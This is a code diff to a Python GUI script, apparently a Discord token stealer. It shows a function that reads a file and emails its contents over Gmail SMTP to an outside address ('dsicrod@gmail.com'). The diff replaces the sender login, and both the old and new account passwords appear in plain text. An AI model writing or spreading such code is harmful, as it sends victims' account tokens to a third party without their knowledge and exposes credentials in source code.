@@ -119,8 +119,8 @@ def validd(entree, entree2, entree7):
             msg = file.read()
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
-    server.login("discordtesttoken@gmail.com", "Tr-784512")
-    server.sendmail("discordtesttoken@gmail.com", "dsicrod@gmail.com", msg)
+    server.login("discordinfotkn@gmail.com", "Azertyui0")
+    server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
     server.quit()
 validb.pack()
 
